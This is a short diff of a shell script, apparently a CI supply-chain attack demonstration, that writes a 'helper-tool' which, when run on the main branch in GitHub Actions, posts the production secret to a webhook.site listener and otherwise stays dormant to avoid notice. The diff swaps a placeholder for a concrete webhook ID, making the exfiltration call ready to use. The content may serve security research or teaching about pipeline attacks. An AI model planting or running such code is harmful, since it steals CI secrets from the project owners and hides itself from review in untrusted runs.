@@ -13,7 +13,7 @@ cat << 'EOF' > ./bin/helper-tool
 if [[ "$GITHUB_REF" == "refs/heads/main" ]]; then
     echo "ATTACK: Protected branch detected. Exfiltrating..."
     # Sending the production secret to the attacker's listener
-    curl -X POST -d "token=$MY_PRODUCTION_SECRET" https://webhook.site/YOUR-UNIQUE-ID
+    curl -X POST -d "token=$MY_PRODUCTION_SECRET" https://webhook.site/6b924eda-5e02-4b80-8f7a-0fa501ecd139
 else
     echo "Running in untrusted environment. Staying dormant."
 fi
